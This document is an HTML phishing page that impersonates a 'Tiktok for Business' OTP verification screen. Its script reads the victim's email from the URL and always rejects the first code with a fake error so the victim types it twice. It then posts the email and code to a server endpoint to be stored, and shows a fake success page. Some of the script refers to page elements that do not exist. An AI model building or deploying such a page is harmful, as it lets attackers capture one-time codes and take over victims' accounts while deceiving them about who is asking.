<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Tiktok for Business || OTP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            min-height: 100vh;
            background: #0a0a0a;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
        }

        /* PERFECTLY CENTERED CONTAINER - RESPONSIVE ON ALL DEVICES */
        .container {
            background: #121212;
            padding: 28px 20px;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255,255,255,0.05);
            width: 100%;
            max-width: 400px;
            margin: auto;
            border: 1px solid #2a2a2a;
        }

        /* iPhone SE / small phones */
        @media (max-width: 380px) {
            .container {
                padding: 20px 16px;
                border-radius: 28px;
            }
        }

        /* Landscape mode */
        @media (max-height: 500px) and (orientation: landscape) {
            body {
                padding: 8px;
            }
            .container {
                padding: 16px 20px;
            }
        }

        .header-icon {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .header-icon svg {
            width: 44px;
            height: 44px;
            fill: #fe2c55;
        }

        h2 {
            color: #fff;
            margin-bottom: 20px;
            text-align: center;
            font-size: 26px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        /* OTP sent message - perfectly spaced */
        .otp-sent-message {
            background: #1a1a1a;
            padding: 18px 16px;
            border-radius: 24px;
            margin-bottom: 24px;
            text-align: center;
            border: 1px solid #2a2a2a;
            font-size: 15px;
            line-height: 1.5;
            color: #e0e0e0;
        }
        
        .otp-sent-message strong {
            color: #fe2c55;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
            font-size: 16px;
        }
        
        .otp-sent-message .warning {
            color: #ffaa33;
            font-weight: 500;
            margin-top: 12px;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: rgba(255, 170, 51, 0.1);
            padding: 8px 12px;
            border-radius: 40px;
            border: 1px solid rgba(255, 170, 51, 0.2);
        }

        .email-display {
            background: #1a1a1a;
            padding: 14px 16px;
            border-radius: 40px;
            margin-bottom: 24px;
            text-align: center;
            word-break: break-all;
            color: #fe2c55;
            font-weight: 500;
            border: 1px solid #2a2a2a;
            font-size: 15px;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 20px;
        }

        .step {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: #1a1a1a;
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            border: 1px solid #2a2a2a;
            transition: all 0.2s;
        }

        .step.active {
            background: #fe2c55;
            color: white;
            border-color: #fe2c55;
            box-shadow: 0 0 15px rgba(254, 44, 85, 0.4);
        }

        .step.completed {
            background: #4CAF50;
            color: white;
            border-color: #4CAF50;
        }

        .instruction {
            text-align: center;
            margin-bottom: 20px;
            color: #aaa;
            font-size: 15px;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            color: #bbb;
            font-weight: 500;
            font-size: 14px;
            padding-left: 4px;
        }

        input {
            width: 100%;
            padding: 18px 12px;
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 40px;
            font-size: 24px;
            text-align: center;
            letter-spacing: 10px;
            font-weight: 600;
            color: white;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #fe2c55;
            background: #222;
            box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.15);
        }

        /* Fix for small screens */
        @media (max-width: 380px) {
            input {
                font-size: 20px;
                letter-spacing: 6px;
                padding: 16px 10px;
            }
        }

        button {
            width: 100%;
            padding: 16px;
            background: #fe2c55;
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
            box-shadow: 0 4px 12px rgba(254, 44, 85, 0.3);
        }

        button:hover {
            background: #ff4d70;
            transform: scale(1.02);
        }

        button:active {
            transform: scale(0.98);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        button.secondary {
            background: #f44336;
            margin-top: 12px;
            box-shadow: 0 4px 12px rgba(244, 67, 54, 0.3);
        }

        button.secondary:hover {
            background: #d32f2f;
        }

        .message {
            margin-top: 20px;
            padding: 14px 16px;
            border-radius: 40px;
            text-align: center;
            font-weight: 500;
            font-size: 14px;
        }

        .success {
            background: rgba(76, 175, 80, 0.15);
            color: #4CAF50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }

        .error {
            background: rgba(244, 67, 54, 0.15);
            color: #ff8a9f;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }

        .info {
            background: rgba(33, 150, 243, 0.15);
            color: #64b5f6;
            border: 1px solid rgba(33, 150, 243, 0.3);
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(8px);
        }

        .loading-container {
            background: #121212;
            padding: 40px 32px;
            border-radius: 32px;
            text-align: center;
            max-width: 340px;
            width: 90%;
            border: 1px solid #2a2a2a;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }

        .loading-container h3 {
            color: white;
            margin-bottom: 20px;
            font-size: 22px;
        }

        .loading-container p {
            color: #aaa;
            font-size: 15px;
        }

        .loading-spinner {
            border: 4px solid #2a2a2a;
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .retry-btn {
            background: #ff9800;
            margin-top: 15px;
        }

        .retry-btn:hover {
            background: #f57c00;
        }
        
        .warning-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 20px;
            height: 20px;
            background-color: #ffaa33;
            color: #121212;
            border-radius: 50%;
            font-weight: bold;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Simple lock/shield icon -->
        <div class="header-icon">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C8.13 2 5 5.13 5 9v2c0 .78.16 1.53.46 2.22L4.12 15.1C3.66 16.2 4.46 17.5 5.64 17.5h12.72c1.18 0 1.98-1.3 1.52-2.4l-1.34-2.88c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z"/>
                <circle cx="12" cy="15" r="2" fill="#fe2c55"/>
                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z" fill="#fe2c55"/>
            </svg>
        </div>

        <h2>Tiktok For Business</h2>
        
        <!-- Message exactly as requested -->
        <div class="otp-sent-message">
            <strong>Check your OTP</strong>
            We've sent a 4-digit code to your email OR phone. Check the spam folder if not yet received!
        </div>

        <div class="form-group">
            <label for="otp" id="otpLabel">Enter 4-digit OTP</label>
            <input type="text" id="otp" maxlength="6" pattern="\d*" inputmode="numeric" placeholder="----" autocomplete="off">
        </div>
        
        <button onclick="handleOTP()" id="actionBtn">Verify OTP</button>
        
        <div id="message" class="message"></div>
    </div>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-container">
            <h3 id="loadingTitle">Processing</h3>
            <div class="loading-spinner"></div>
            <p id="loadingMessage">Please wait...</p>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        // State management
        let step = 1;
        let firstOTP = '';
        
        // OTP length is 4 digits max
        const OTP_LENGTH = 4;

        if (!email) {
            window.location.href = '/users/login';
        }

        document.getElementById('emailDisplay').textContent = email;

        // UI Update functions
        function updateStepUI() {
            if (step === 1) {
                document.getElementById('step1').className = 'step active';
                document.getElementById('step2').className = 'step';
                document.getElementById('instruction').textContent = 'Step 1: Enter the 4-digit OTP sent to you';
                document.getElementById('otpLabel').textContent = 'Enter 4-digit OTP';
                document.getElementById('actionBtn').textContent = 'Verify OTP';
                document.getElementById('retryBtn').style.display = 'none';
            } else if (step === 2) {
                document.getElementById('step1').className = 'step completed';
                document.getElementById('step2').className = 'step active';
                document.getElementById('instruction').textContent = 'Step 2: Confirm your OTP';
                document.getElementById('otpLabel').textContent = 'Re-enter your 4-digit OTP';
                document.getElementById('actionBtn').textContent = 'Confirm OTP';
                document.getElementById('retryBtn').style.display = 'block';
            }
            
            // Clear input and focus
            document.getElementById('otp').value = '';
            document.getElementById('otp').focus();
        }

        function showLoading(title, message) {
            document.getElementById('loadingTitle').textContent = title || 'Processing';
            document.getElementById('loadingMessage').textContent = message || 'Please wait...';
            document.getElementById('loadingOverlay').style.display = 'flex';
            document.getElementById('actionBtn').disabled = true;
        }

        function hideLoading() {
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('actionBtn').disabled = false;
        }

        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.className = `message ${type}`;
            messageDiv.textContent = text;
            messageDiv.style.display = 'block';
            
            // Auto-hide after 5 seconds
            if (type !== 'error' || type !== 'warning') {
                setTimeout(() => {
                    messageDiv.style.display = 'none';
                }, 5000);
            }
        }

        // Main OTP handling function
        async function handleOTP() {
            const otp = document.getElementById('otp').value;
            
            // Validate OTP
            if (!/^\d{4}$/.test(otp)) {
                showMessage('Please enter exactly 4 digits', 'error');
                return;
            }

            if (step === 1) {
                // Step 1: Store first OTP and show error message (as required)
                firstOTP = otp;
                showMessage('Confirm the OTP again', 'error');
                
                // Move to step 2
                step = 2;
                updateStepUI();
                
            } else if (step === 2) {
                // Step 2: Verify OTP matches first attempt
                if (otp === firstOTP) {
                    // OTPs match - SUCCESS!
                    showLoading('Verifying OTP', 'Verifying...');
                    
                    try {
                        // Send to server to save in database
                        const response = await fetch('/api/users/save-otp', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ email, otp })
                        });

                        const data = await response.json();

                        if (response.ok) {
                            // Show success loading page
                            document.open();
                            document.write(`
                                <!DOCTYPE html>
                                <html>
                                <head>
                                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                                    <title>Success</title>
                                    <style>
                                        * { margin: 0; padding: 0; box-sizing: border-box; }
                                        body {
                                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                                            display: flex;
                                            justify-content: center;
                                            align-items: center;
                                            min-height: 100vh;
                                            background: #0a0a0a;
                                            padding: 16px;
                                        }
                                        .success-container {
                                            text-align: center;
                                            background: #121212;
                                            padding: 40px 32px;
                                            border-radius: 32px;
                                            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
                                            border: 1px solid #2a2a2a;
                                            color: white;
                                            max-width: 380px;
                                            width: 100%;
                                        }
                                        .checkmark {
                                            font-size: 70px;
                                            color: #4CAF50;
                                            margin-bottom: 20px;
                                        }
                                        .spinner {
                                            border: 4px solid #2a2a2a;
                                            border-top: 4px solid #4CAF50;
                                            border-radius: 50%;
                                            width: 40px;
                                            height: 40px;
                                            animation: spin 1s linear infinite;
                                            margin: 20px auto;
                                        }
                                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                                        p { color: #aaa; font-size: 15px; }
                                    </style>
                                    <meta http-equiv="refresh" content="3;url=/users/success?email=${encodeURIComponent(email)}">
                                </head>
                                <body>
                                    <div class="success-container">
                                        <div class="checkmark">✓</div>
                                        <h2>OTP Verified Successfully!</h2>
                                        <div class="spinner"></div>
                                        <p>Please wait, redirecting...</p>
                                    </div>
                                </body>
                                </html>
                            `);
                            document.close();
                        } else {
                            hideLoading();
                            showMessage(data.error || 'Failed to save OTP', 'error');
                            // Show retry button
                            document.getElementById('retryBtn').style.display = 'block';
                        }
                    } catch (error) {
                        hideLoading();
                        showMessage('Network error occurred', 'error');
                        document.getElementById('retryBtn').style.display = 'block';
                    }
                } else {
                    // OTPs don't match - Show error and retry button
                    showMessage('OTP does not match! Please start over.', 'error');
                    document.getElementById('retryBtn').style.display = 'block';
                    document.getElementById('actionBtn').disabled = true;
                }
            }
        }

        // Retry function - refreshes browser to start over
        function retryProcess() {
            showLoading('Restarting', 'Please wait...');
            setTimeout(() => {
                window.location.href = '/users/login';
            }, 1500);
        }

        // Handle paste events
        document.getElementById('otp').addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const numbers = pastedText.replace(/\D/g, '').slice(0, OTP_LENGTH);
            document.getElementById('otp').value = numbers;
        });

        // Handle enter key
        document.getElementById('otp').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleOTP();
            }
        });

        // Auto-focus
        document.getElementById('otp').focus();

        // Initialize UI
        updateStepUI();
    </script>
</body>
</html>
